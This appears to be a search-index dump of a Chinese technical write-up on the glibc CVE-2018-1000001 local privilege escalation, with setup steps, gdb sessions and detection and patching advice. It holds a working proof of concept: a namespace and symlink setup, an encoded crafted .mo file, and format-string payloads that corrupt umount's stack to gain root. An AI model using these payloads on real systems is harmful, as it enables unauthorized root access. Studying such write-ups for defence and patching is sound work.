-m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\nmkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/xxx/C.UTF-8.utf8/LC_MESSAGES\" \"(unreachable)/x\" \nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\necho $$\n46416\n\n\n# Terminal 2\ncd /proc/46416/cwd\ngdb\nfile /bin/umount\nset args --lazy down \nset env LC_ALL=C.UTF-8\nb main\nr\nb *umount_one if *(char *)$rsi == '('\nc\nb mk_exit_code\nc\nb *__dcigettext+1265\nc\n\n\n# \u901a\u8fc7\u8c03\u7528\u4fe1\u606f\u627e\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\n\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\"\n# \u56e0\u6b64\u76f8\u5bf9\u8def\u5f84\u5e94\u6539\u4e3a\uff1a__gconv_find_shlib(\u539fexp\u4e2d\u662ffrom_archive)\n[---------------------------------registers-------------------------\n...\nRCX: 0x1 \nRDX: 0x55698c49ee78 (\"%s: not mounted\")\nRSI: 0x55698e233200 (\"AAAAAA/A\")\nRDI: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\n...\nR8 : 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n...\n[-------------------------------------code-------------------------\n...\n=> 0x7fb5d4d69d21 <__dcigettext+1265>:  call   0x7fb5d4d68bc0 <_nl_find_msg>\n ...\nGuessed arguments:\narg[0]: 0x55698e23be90 --> 0x55698e23c3b0 (\"(unreachable)/tmp/__gconv_find_shlib/C.UTF-8/LC_MESSAGES/util-linux.mo\")\narg[1]: 0x55698e233200 (\"AAAAAA/A\")\narg[2]: 0x55698c49ee78 (\"%s: not mounted\")\narg[3]: 0x1 \narg[4]: 0x7fff5515b1b8 --> 0x7fb5d5b84000 --> 0x7fb5d572e000 --> 0x10102464c457f \n\n\nBreakpoint 4, 0x00007fb5d4d69d21 in __dcigettext (\n...\ngdb-peda$ \n\n\n# \u8c03\u7528\u6808\u5982\u4e0b\ngdb-peda$ bt\n#0  0x00007fb5d4d69d21 in __dcigettext (\n    domainname=0x55698e233580 \"util-linux\", \n    msgid1=0x55698c49ee78 \"%s: not mounted\", \n    msgid2=0x0, plural=0x0, n=0x0, \n    category=0x5) at dcigettext.c:742\n#1  0x000055698c49d68d in mk_exit_code (cxt=0x55698e2335a0, rc=0xffffffff)\n    at sys-utils/umount.c:206\n#2  0x000055698c49dba1 in umount_one (cxt=0x55698e2335a0, spec=...\n#3  0x000055698c49d152 in main (argc=0x0, argc@entry=0x3, ...\n#4  0x00007fb5d4d5c2e1 in __libc_start_main (main=0x55698c49c970 ...\n#5  0x000055698c49d3aa in _start ()\n\n\n\n\n\n\n\n\u5982\u4f55\u5728umount\u4e2ddump\u6808\u5185\u5b58\u7684\u4f4d\u7f6e\u4e0b\u65ad\u70b9\n\n\n\n\ngcc my_exp.c -o exp4dbg -g\ngdb\nfile exp4dbg\nb main\nr\nset follow-fork-mode parent\nb attemptEscalation\nc\nset follow-fork-mode child\nc\nb *umount_one if *(char *)$rsi == '('\nc\nb mk_exit_code\nc\nb *mk_exit_code+165\nc\n\n\n=> 0x561465315695 <mk_exit_code+165>: call   0x561465314560 <warnx@plt>\n\n\ngdb-peda$ bt\n#0  0x0000561465315695 in mk_exit_code (cxt=0x5614658005a0, ...\n#1  0x0000561465315ba1 in umount_one (cxt=0x5614658005a0, spec=...\n#2  0x0000561465315152 in main (argc=0xa, argc@entry=0x16, \n...\n#3  0x00007f29943012e1 in __libc_start_main (main=0x561465314970 ...\n#4  0x00005614653153aa in _start ()\ngdb-peda$ \n\n\n\n\n\nd. \u5229\u7528\u6838\u5fc3\u8981\u7d20\n\n\n\n\n\n\n\u5229\u7528\u8d8a\u754c\u5199\u6f0f\u6d1e\uff0c\u63a7\u5236gettext\u51fd\u6570\u52a0\u8f7d\u7279\u5236\u7684NLS\u6587\u4ef6\uff0c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32dump\u6808\u5185\u5b58\u6839\u636e\u6808\u5185\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6libc\u57fa\u5730\u5740\u7ed5\u8fc7ASLR\n\n\n\n\n\n\n\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u6808\u5185\u5b58\u51fd\u6570\u53c2\u6570\u548c\u8fd4\u56de\u5730\u5740\u8fdb\u800c\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\n\n\n\n\n\n\n\u901a\u8fc7setdate\u8fd9\u6837\u7684\u7b80\u5355\u51fd\u6570\u4e3aexecl\u6784\u9020\u5408\u9002\u7684\u6808\u73af\u5883\u5b9e\u73b0ROP\n\n\n\n\n\n\n\u901a\u8fc7\u63a7\u5236suid\u8fdb\u7a0bumount\u7684\u6267\u884c\u6d41\u7a0b\u6765\u521b\u5efaroot shell\u5b9e\u73b0\u63d0\u6743\n\n\n\n\n\n\n5. \u9632\u62a4\u5efa\u8bae\n\n\n\n\n\u68c0\u67e5\u7cfb\u7edf\u662f\u5426\u5b58\u5728\u98ce\u9669\uff0c\u53ca\u65f6\u66f4\u65b0\u7cfb\u7edf\uff0c\u5b89\u88c5\u8865\u4e01\u3002\u68c0\u6d4b\u65b9\u5f0f\u5982\u4e0b\uff1a\n\n\n\n\n# \u65b9\u5f0f\u4e00\uff1a\n# Terminal 1\n$ sudo echo 1 > /proc/sys/kernel/unprivileged_userns_clone\n$ /usr/bin/unshare -m -U --map-root-user /bin/bash\n$ mount -t tmpfs tmpfs /tmp\n$ cd /tmp\n$ echo $$\n2607\n\n# Terminal 2\n$ cd /proc/2607/cwd\n$ realpath .\n(unreachable)/tmp\n# \u5982\u679c\u8fd4\u56de\u503c\u5305\u542b(unreachable)\u5b57\u7b26\u4e32\u5219\u53ef\u4ee5\u5224\u65ad\u5b58\u5728\u98ce\u9669\n\n# \u65b9\u5f0f\u4e8c\uff1a\n# \u67e5\u770bglibc\u7684package\u66f4\u65b0\u65e5\u5fd7\u662f\u5426\u5b58\u5728CVE-2018-1000001\u7684\u8865\u4e01\n# \u4ee5\u5b89\u88c5\u4e86\u8865\u4e01\u7684ubuntu16\u4e3a\u4f8b\uff1a\n$ PAGER=cat apt-get -q=2 changelog libc6\n...\n  * SECURITY UPDATE: Buffer underflow in realpath()\n    - debian/patches/any/cvs-make-getcwd-fail-if-path-is-no-absolute.diff:\n      Make getcwd(3) fail if it cannot obtain an absolute path\n    - CVE-2018-1000001\n...\n\n\n\n\n\n\n\n\n\n\u6839\u636e\u5206\u6790\uff0c\u8be5\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u5f00\u542funprivileged_userns_clone\u6743\u9650\uff0c\u6240\u4ee5\u5728\u7d27\u6025\u60c5\u51b5\u4e0b\uff0c\u6700\u5feb\u901f\uff0c\u65b9\u4fbf\u7684\u9632\u62a4\u65b9\u5f0f\u662f\u68c0\u67e5\u8be5\u914d\u7f6e\uff0c\u5e76\u786e\u4fdd\u5176\u5728\u4e0d\u9700\u8981\u7684\u60c5\u51b5\u4e0b\u5173\u95ed\u4ee5\u963b\u65ad\u6f0f\u6d1e\u5229\u7528\u7684\u57fa\u7840(\u4f46\u662f\u6b64\u914d\u7f6e\u662f\u67d0\u4e9b\u5bb9\u5668\u5e94\u7528\u7684\u57fa\u7840)\u3002\n\n\n\n\n\n\n\u7531\u4e8e\u6f0f\u6d1e\u5229\u7528\u901a\u8fc7\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u5b9e\u73b0\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6ce8\u5165\uff0c\u56e0\u6b64\u76d1\u63a7\u7cfb\u7edf\u7684\u8bed\u8a00\u652f\u6301\u6587\u4ef6\u80fd\u591f\u8d77\u5230\u4e00\u5b9a\u4f5c\u7528\u3002\u4f8b\u5982\uff0c\u76d1\u63a7\u8fdb\u7a0b\u8bfb\u53d6\u548c\u521b\u5efa\u7684.mo\u6587\u4ef6\u662f\u5426\u6709\u5f02\u5e38\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32(\u6bd4\u5982\u5305\u542b%n, %$\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32)\uff0c\u53ef\u4ee5\u53ea\u5728\u521b\u5efa\u7684\u65f6\u5019\u68c0\u6d4b\u51cf\u5c11\u6027\u80fd\u635f\u5931\uff1a\n\n\n\n\n\n\nroot@debian:/usr/share/locale/gl/LC_MESSAGES/# file util-linux.mo\nutil-linux.mo: GNU message catalog (little endian), revision 0.0, 214 messages\n\n\n\n\n6.\u53c2\u8003\n\n\nLibcRealpathBufferUnderflow\n\n\nhttps://www.freebuf.com/column/162202.html\n\n\nhttps://bbs.pediy.com/thread-228678.htm",
            "title": "Cve 2018 1000001 \u5206\u6790"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#glibccve-2018-1000001",
            "text": "",
            "title": "Glibc\u672c\u5730\u63d0\u6743\u6f0f\u6d1e\u5206\u6790(CVE-2018-1000001)"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#0",
            "text": "invincible1944@gmail.com",
            "title": "0. \u4f5c\u8005"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#1",
            "text": "\u6f0f\u6d1e\u76f8\u5173\u8f6f\u4ef6\uff1aglibc <= 2.26    GLibc\u7b80\u4ecb    GNU/Linux systems\u7b49\u4f7f\u7528Linux\u5185\u6838\u7cfb\u7edf\u7684\u6838\u5fc3C\u4ee3\u7801\u5e93    \u8fd9\u4e9b\u4ee3\u7801\u5e93\u63d0\u4f9b\u4e25\u683c\u9075\u5faaISO C11, POSIX.1-2008, BSD\u7b49\u6807\u51c6\u7684API    \u8fd9\u4e9bAPI\u5305\u542b open, read, write, malloc, printf\u7b49\u57fa\u672c\u51fd\u6570    \u53c2\u8003\u4e00(GLIBC \u5b98\u7f51) ,  \u53c2\u8003\u4e8c(Linux manual)      \u6f0f\u6d1e\u5371\u5bb3    \u5bf9\u672a\u5b89\u88c5\u8865\u4e01\u7684Linux\u7cfb\u7edf\u8fdb\u884c\u672c\u5730\u63d0\u6743\u3002    \u53c2\u8003: Known Affected Software Configurations      \u76f8\u5173\u80cc\u666f\u77e5\u8bc6  namespaces  user_namespaces  mount_namespaces  setlocale - set the current locale  Gettext  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32",
            "title": "1. \u80cc\u666f\u4ecb\u7ecd"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#2",
            "text": "\u6f0f\u6d1e\u539f\u7406\uff1a\u7f13\u51b2\u533a\u8fb9\u754c\u5224\u65ad\u4e0d\u4e25\u683c\u9020\u6210\u8d8a\u754c\u5199\u3002   \u6f0f\u6d1e\u6240\u5c5e\u8f6f\u4ef6\u94fe\u63a5\uff0c\u7248\u672c\uff0c\u6a21\u5757\uff0c\u76ee\u5f55\uff0c\u6587\u4ef6\uff0c\u4ee3\u7801\u884c   \u6f0f\u6d1e\u8f6f\u4ef6\u7248\u672c\uff1aglibc <= 2.26    \u6f0f\u6d1e\u4ee3\u7801\u4f4d\u7f6e\uff1a glibc-2.26/stdlib/canonicalize.c -> __realpath( line 122, 199 )     GLibc \u5b98\u7f51 GLibc \u6e90\u7801\u5e93        \u6f0f\u6d1e\u6240\u5c5e\u7c7b\u578b\uff1a CWE-787: Out-of-bounds Write   \u6f0f\u6d1e\u8865\u4e01\uff1a glibc upstream  \u6f0f\u6d1eCVE\u53f7\uff1a CVE-2018-1000001",
            "title": "2. \u6f0f\u6d1e\u5206\u6790"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#3-poc",
            "text": "",
            "title": "3. POC"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#a-poc",
            "text": "\u6784\u9020\u7279\u6b8a\u7684namespace\u8fdb\u7a0b(\u4e0b\u6587\u79f0ns_proc)\uff0c\u5e76\u5728\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u6784\u5efa\u7279\u6b8a\u7684\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u542b\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\uff0c\u548c\u7279\u5236\u7684NLS\u6587\u4ef6\uff1b  \u4f7fumount\u5728ns_proc\u8fdb\u7a0b\u7684\u5de5\u4f5c\u76ee\u5f55\u4e0b\u8fd0\u884c\uff0c\u5378\u8f7d\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u89e6\u53d1\u8d8a\u754c\u5199\uff0c\u8986\u76d6setloacle\u9700\u8981\u52a0\u8f7d\u7684\u6b63\u5e38\u6587\u4ef6\u8def\u5f84\uff0c\u8feb\u4f7f\u5176\u4f7f\u7528\u76f8\u5bf9\u8def\u5f84\u52a0\u8f7d\u7279\u5236\u7684 NLS\u6587\u4ef6\uff1b  \u7279\u5236NLS\u6587\u4ef6\u80fd\u591f\u63a7\u5236umount\u7684error\u4fe1\u606f\u7684\u683c\u5f0f\uff0c\u53ef\u4ee5\u5229\u7528 %n \u83b7\u53d6\u5199\u5165\u6808\u5185\u5b58\u7684\u80fd\u529b\uff0c\u800c\u521a\u597d\u80fd\u591f\u4fee\u6539umount libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u6807\u5fd7\u4f4d\uff0c\u4f7fumount\u8ba4\u4e3a\u8c03\u7528\u8005\u4e3aroot\u6743\u9650\uff0c\u8fdb\u800c\u5141\u8bb8\u540e\u7eed\u7684 umout / \u64cd\u4f5c\uff0c\u4ece\u800c\u5b9e\u73b0DOS\u3002",
            "title": "a. POC\u539f\u7406"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#b-poc",
            "text": "\u89c1\u9644\u4ef6: cve-2018-1000001-01.md",
            "title": "b. POC\u6e90\u7801"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#c",
            "text": "\u590d\u73b0\u73af\u5883    \u73af\u5883\u6e05\u5355   \u7cfb\u7edf\u7248\u672c: Linux debian 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux  \u53d1\u884c\u7248\u540d\u79f0: Debian GNU/Linux 9 (stretch)  glibc\u7248\u672c:  Debian GLIBC 2.24-11+deb9u4  gcc\u7248\u672c:  gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516  umount\u7248\u672c: umount from util-linux 2.29.2   \u955c\u50cf\u4e0b\u8f7d\u5730\u5740\uff1a debian-9.12.0-amd64-DVD-1.iso  \u865a\u62df\u673a\u8f6f\u4ef6\uff1aVMwareFusion \u4e13\u4e1a\u7248 11.5.1 (15018442)  \u865a\u62df\u673a\u8f6f\u4ef6\uff1aQEMU emulator version 4.2.0     QEMU\u865a\u62df\u673a\u642d\u5efa\u6b65\u9aa4\uff1a      # 1. \u53bb\u4e0a\u9762\ud83d\udc46\u7ed9\u51fa\u7684\u5730\u5740\u5904\u4e0b\u8f7d\u955c\u50cf\n# 2. \u521b\u5efa\u865a\u62df\u673a\u786c\u76d8\n$ qemu-img create -f qcow2 debian9.img 10G\n\n# 3. \u5b89\u88c5\u865a\u62df\u673a(\u6709\u6761\u4ef6\u53ef\u4ee5\u589e\u52a0-enable-kvm\u9009\u9879)\n# \u5224\u65ad\u65b9\u6cd5\uff1a\n#   grep -E 'vmx|svm' /proc/cpuinfo\n#   lsmod | grep kvm\n$ qemu-system-x86_64  -m 2048 -hda debian9.img  -cdrom ./debian-9.12.0-amd64-DVD-1.iso\n\n# 4. \u542f\u52a8\u865a\u62df\u673a\n$ qemu-system-x86_64 -m 2048  debian9.img\n\n# 5. \u542f\u52a8\u540e\u5b89\u88c5GCC\n$ su\n$ apt install gcc   Step1 - \u8bbe\u7f6eunprivileged_userns_clone\u6743\u9650   # \u5c06unprivileged_userns_clone\u8bbe\u7f6e\u4e3a1(\u9ed8\u8ba4\u4e3a0)\nroot$ echo 1 > /proc/sys/kernel/unprivileged_userns_clone   Step2 - \u521b\u5efa\u5177\u6709\u72ec\u7acb user/mount namespace\u7684\u8fdb\u7a0b(\u4e0b\u6587\u79f0us_proc)   \u5176\u4ed6\u8fdb\u7a0b\u8fdb\u5165 us_proc \u8fdb\u7a0b\u7684 \"/proc/[us_proc pid]/cwd\" \u76ee\u5f55\u540e\uff0c\u7528 realpath(getcwd) \u83b7\u53d6\u7684\u76f8\u5bf9\u76ee\u5f55\u5747\u5305\u542b \"(unreachable)/tmp/\" \u524d\u7f00  /usr/bin/unshare -m -U --map-root-user /bin/bash\nmount -t tmpfs tmpfs /tmp\ncd /tmp\nchmod 00755 .\n\n# Terminal 1\ndebian@debian:~/Desktop/work$ /usr/bin/unshare -m -U --map-root-user /bin/bash\nroot@debian:~/Desktop/work# mount -t tmpfs tmpfs /tmp\nroot@debian:~/Desktop/work# cd /tmp\nroot@debian:/tmp# chmod 00755 .\nroot@debian:/tmp# echo $$\n52426\nroot@debian:/tmp# \n\n# \u6548\u679c\u5982\u4e0b\n# Terminal 2\n$ cd /proc/52426/cwd\ndebian@debian:/proc/52426/cwd$ \ndebian@debian:/proc/52426/cwd$ realpath .\n(unreachable)/tmp\ndebian@debian:/proc/52426/cwd$ realpath ../x\n(unreachable)/x\ndebian@debian:/proc/52426/cwd    Step3 - \u521b\u5efa\u6f0f\u6d1e\u5229\u7528\u9700\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6   __gconv_find_shlib/C/LC_MESSAGES \u76ee\u5f55\u662fsetloacale\u5bfb\u627emo\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\uff0c\n    \u7279\u522b\u8981\u6ce8\u610f\u7684\u4e00\u70b9\uff1a __gconv_find_shlib  \u5728\u4e0d\u540c\u7cfb\u7edf\u4e0a\u4e0d\u4e00\u6837\uff0c\u5728\u6f0f\u6d1e\u4f5c\u8005\u7684exp\u4e2d\u8fd8\u7ed9\u51fa\u4e86\u4e24\u4e2a\u76ee\u5f55( from_archive, _nl_load_locale_from_archive ) \uff1b  \"(unreachable)/x\"  \u662frealpath\u89e3\u6790\u7b26\u53f7\u94fe\u63a5\u7684\u8fd4\u56de\u503c\u5bf9\u5e94\u7684\u76ee\u5f55\uff1b  util-linux.mo \u6587\u4ef6\u7528\u4e8e\u4fdd\u5b58\u7279\u5236\u7684libc\u4f9d\u8d56\u7684.mo\u7ffb\u8bd1\u6587\u4ef6\uff1b  \u7b26\u53f7\u94fe\u63a5\u7528\u4e8e\u89e6\u53d1\u8d8a\u754c\u5199\u6f0f\u6d1e\uff1b  util-linux.mo \u4fdd\u5b58\u4e86\u89e6\u53d1DOS\u7684\u7279\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \"AA%6$lnlnAAAAAAAAAA\" \u3002     mkdir -p -- \"(unreachable)/tmp\" \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES\" \"(unreachable)/x\"\nln -s ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A \"(unreachable)/tmp/down\"\nbase64 -d <<B64-EOF | bzip2 -cd > \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\nQlpoOTFBWSZTWTOfm9IAAGX/pn6UlARGB+FeKyZnAD/n3mACAAAgAAEgAJSIqfkpspk0eUGJ6gAG\nmQeoaD1PJAamlPJGCNMTIaNGmnqMQ0AAzSwpEWpQICVUw+490ohZBgZ+s4EBAZCn/TavSQshtCiv\niG6HOehyAp4FPt3zkpdTxNchTYITLBkXUjsgpN2QDBNX8qmbpkVgfLXKcQc1ZhVF0FxUQOtnbGlL\n5NhRmORwmQF1Dw3Yu1mds6tGAmnLwWwc2KRKGl5hcLuSKcKEgZz83pA=\nB64-EOF\n\nroot@debian:/tmp# tree\n.\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/A\n    \u2502   \u2514\u2500\u2500 __gconv_find_shlib\n    \u2502       \u2514\u2500\u2500 C\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\nroot@debian:/tmp# strings \"(unreachable)/tmp/__gconv_find_shlib/C/LC_MESSAGES/util-linux.mo\"\n%s: not mounted\nLanguage: en\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\nAA%6$lnlnAAAAAAAAAA    Step4 - \u901a\u8fc7umount\u89e6\u53d1DOS    LC_ALL\u73af\u5883\u53d8\u91cf\u4f1a\u4f7fsetlocale\u51fd\u6570\u53bb\u52a0\u8f7d\u7ffb\u8bd1\u6587\u4ef6\uff1b    umount\u4f1a\u5148\u5c1d\u8bd5\u5378\u8f7ddown\u76ee\u5f55\uff0c\u8fd9\u4e2a\u7279\u5236\u7684\u7b26\u53f7\u94fe\u63a5\u4f1a\u89e6\u53d1realpath\u6f0f\u6d1e\u9020\u6210\u8d8a\u754c\u5199\uff0c\u5c06\u5806\u5185\u5b58\u4e2d\u7684 \"/usr/lib/locale/C.utf8/LC_CTYPE\" \u8def\u5f84\u5b57\u7b26\u4e32\u4e2dLC_CTYPE\u8986\u76d6\u4e3a AAAAAA(\u7565...)/A \uff1b    \u5f53realpath\u5c06down\u89e3\u6790\u4e3a(unreachable)/x\u540e\uff0cumount\u4f1a\u8c03\u7528warnx\u51fd\u6570\u6253\u5370\u8b66\u544a\u4fe1\u606f\uff0c\u6b64\u65f6\u4f1a\u52a0\u8f7d\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\uff0c \"AA%6$lnlnAAAAAAAAAA\" \u66ff\u6362\u6389warnx\u51fd\u6570\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570 \"%s: not mounted\" \uff1b    \u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0cumount\u6808\u4e2dRSP\u5b58\u653e\u7684\u5730\u5740\u5904\u7684\u6307\u9488\u6307\u5411\u7684 long int\u503c(*(long *)$RSP) \u4f1a\u88ab\u4fee\u6539\u4e3a2\u3002\u8fd9\u4f1a\u5c06\u8be5\u5904\u5b58\u653e\u7684libmnt_context\u7ed3\u6784\u4f53\u7684restricted\u5b57\u6bb5\u4fee\u6539\u4e3a0, \u4ece\u800c\u8ba9umount\u8ba4\u4e3a\u8c03\u7528\u8005\u662froot\u7528\u6237\uff0c\u5e76\u6210\u529f\u8fdb\u884c\u540e\u9762\u7684umount / \u64cd\u4f5c\u3002  \u8fd9\u4e2a\u6b65\u9aa4\u76f8\u5173\u7684umount\u8c03\u7528\u6808:  main->umount_one->make_exit_code->warnx(_(\"%s: not mounted\"), tgt);  (  \u683c\u5f0f\u5316\u5b57\u7b26\u4e32  ,  x64\u4f20\u53c2\u987a\u5e8f  )      test$ cd /proc/2299/cwd\ntest$ LC_ALL=C.UTF-8 /bin/umount --lazy down /\nAAlnAAAAAAAAAA",
            "title": "c. \u590d\u73b0\u6b65\u9aa4"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#4-exp",
            "text": "",
            "title": "4. EXP"
        },
        {
            "location": "/userspace/cve-2018-1000001-\u5206\u6790/#a-exp",
            "text": "\u51c6\u5907\u9636\u6bb5(prepareNamespacedProcess)   \u5148\u901a\u8fc7clone\u542f\u52a8\u4e00\u4e2a\u62e5\u6709\u72ec\u7acb user & mount namespace \u7684\u5b50\u8fdb\u7a0b\uff0c\n  \u5b50\u8fdb\u7a0b\u542f\u52a8\u540e\uff0c\u4f1a\u5148\u7b49\u5f85\u7236\u8fdb\u7a0b\u5c06\u5176uid\u548cgid\u8bbe\u7f6e\u4e3a0(\u5f53\u524dnamespace)\n  \u7136\u540e mount tmpfs \u5230 /tmp \u76ee\u5f55\uff0c\u5e76\u5207\u6362\u5230 /tmp \u4f5c\u4e3a\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\n  \u521b\u5efa\u4e00\u4e2aready\u6587\u4ef6( O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW|O_NOCTTY )   \u83b7\u53d6\u5f53\u524d\u7cfb\u7edf\u4fe1\u606f    \u5728clone\u51fa\u7684\u5b50\u8fdb\u7a0b\u5de5\u4f5c\u76ee\u5f55( /proc/[pid]/cwd )\u4e2d\u751f\u6210\u4e00\u7cfb\u5217\u6587\u4ef6\u548c\u76ee\u5f55    \u751f\u6210\u7684\u6587\u4ef6\u5982\u4e0b\uff1a  invincible@ubuntu:/proc/10013/cwd$ tree\n.\n\u251c\u2500\u2500 DATEMSK\n\u251c\u2500\u2500 ready\n\u2514\u2500\u2500 (unreachable)\n    \u251c\u2500\u2500 tmp\n    \u2502   \u251c\u2500\u2500 down -> ../x/../../AAA(\u7701\u7565...)A/AAA(\u7701\u7565...)A/A\n    \u2502   \u2514\u2500\u2500 from_archive\n    \u2502       \u251c\u2500\u2500 C.UTF-8\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2502       \u2514\u2500\u2500 util-linux.mo\n    \u2502       \u251c\u2500\u2500 X.x\n    \u2502       \u2502   \u2514\u2500\u2500 LC_MESSAGES\n    \u2502       \u2514\u2500\u2500 X.X\n    \u2502           \u2514\u2500\u2500 LC_MESSAGES\n    \u2502               \u2514\u2500\u2500 util-linux.mo\n    \u2514\u2500\u2500 x\n\n\n10 directories, 5 files \ninvincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executable\n\ninvincible@ubuntu:/proc/10013/cwd$ \ninvincible@ubuntu:/proc/10013/cwd$ file ready \nready: empty\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/C.UTF-8/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: GNU message catalog (little endian), revision 0.0, 4 messages\n\n\ninvincible@ubuntu:/proc/10013/cwd$ file \\(unreachable\\)/tmp/from_archive/X.X/LC_MESSAGES/util-linux.mo \n(\u7701\u7565...)/util-linux.mo: fifo (named pipe)  \u6784\u9020\u7684DATEMSK\u6587\u4ef6\u5185\u5bb9\u4e3a/proc/self/exe\u7b26\u53f7\u94fe\u63a5\u6307\u5411\u7684\u6587\u4ef6:  invincible@ubuntu:/proc/10013/cwd$ cat DATEMSK \n#!/home/invincible/Desktop/test/exp\nunused\ninvincible@ubuntu:/proc/10013/cwd$ file DATEMSK \nDATEMSK: a /home/invincible/Desktop/test/exp script, ASCII text executabl  \u6784\u9020\u7279\u5236\u7684util-linux.mo\u6587\u4ef6\u5185\u5bb9:  invincible@ubuntu:~/Desktop/test$ msgunfmt util-linux.mo -o util-linux.po\ninvincible@ubuntu:~/Desktop/test$ cat util-linux.po \nmsgid \"\"\nmsgstr \"\"\n\"Language: en\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\n\nmsgid \"%s: mountpoint not found\"\nmsgstr \"1234\"\n\n\nmsgid \"%s: not mounted\"\nmsgstr \"\"\n\"AA%6$lnAAAAAA%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n(\u7701\u7565... \u5171256\u4e2a%16lx)\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx\"\n\"%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%016lx%1$68hhx%256$hhn\"\n\n\nmsgid \"\"\n\"%s: target is busy\\n\"\n\"        (In some cases useful info about processes that\\n\"\n\"         use the device is found by lsof(8) or fuser(1).)\"\nmsgstr \"5678\"\ninvincible@ubuntu:~/Desktop/test$   \u63d0\u6743\u9636\u6bb5(attemptEscalation)    \u51c6\u5907\u5de5\u4f5c    \u521b\u5efa\u7528\u4e8e\u548c\u5b50\u8fdb\u7a0b\u901a\u4fe1\u7684pipe\u7528\u4e8e\u8bfb\u53d6\u5b50\u8fdb\u7a0bstdout\u548cstderr    fork\u51fa\u5b50\u8fdb\u7a0b(\u4e0b\u6587\u79f0 umount\u8fdb\u7a0b )\uff0c\u5728\u5b50\u8fdb\u7a0b\u4e2d\u8bbe\u7f6epipe\uff0c\u5207\u6362\u5230 us_proc\u8fdb\u7a0b \u7684\u5de5\u4f5c\u76ee\u5f55\uff0cexecve\u6267\u884cumount\uff0c\u5177\u4f53\u6267\u884c\u547d\u4ee4\uff1a      AANGUAGE=X.X AANGUAGE=X.X (\u7701\u7565...\u5171255\u6b21) LC_ALL=C.UTF-8 /bin/umount  /run /run /run /run /run /run /run /run /run /run down LABEL=78 LABEL=789 LABEL=789a LABEL=789ab LABEL=789abc LABEL=789abcd LABEL=789abcde 